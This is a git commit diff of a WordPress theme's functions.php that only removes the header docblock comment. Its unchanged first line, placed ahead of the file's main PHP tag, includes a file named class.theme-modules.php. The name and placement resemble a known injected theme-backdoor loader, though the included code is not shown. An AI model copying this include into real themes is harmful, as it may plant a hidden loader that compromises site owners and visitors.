57f96fb9421a2d401c747abeaa6e573437c41aab
Rafael Vieira <36818773+rafaelvie@users.noreply.github.com>
2020-05-14 12:09:45 -0300

    Update functions.php

--- functions.php
+++ functions.php
@@ -1,27 +1,4 @@
 <?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
-/**
- * classify functions and definitions.
- *
- * Sets up the theme and provides some helper functions, which are used in the
- * theme as custom template tags. Others are attached to action and filter
- * hooks in WordPress to change core functionality.
- *
- * When using a child theme (see http://codex.wordpress.org/Theme_Development
- * and http://codex.wordpress.org/Child_Themes), you can override certain
- * functions (those wrapped in a function_exists() call) by defining them first
- * in your child theme's functions.php file. The child theme's functions.php
- * file is included before the parent theme's file, so the child theme
- * functions would be used.*
- * Functions that are not pluggable (not wrapped in function_exists()) are
- * instead attached to a filter or action hook.
- *
- * For more information on hooks, actions, and filters,
- * see http://codex.wordpress.org/Plugin_API
- *
- * @package WordPress
- * @subpackage classify
- * @since classify 4.0
- */
 if(function_exists('load_theme_textdomain')){
 	load_theme_textdomain( 'classify', get_template_directory() . '/languages' );
 }
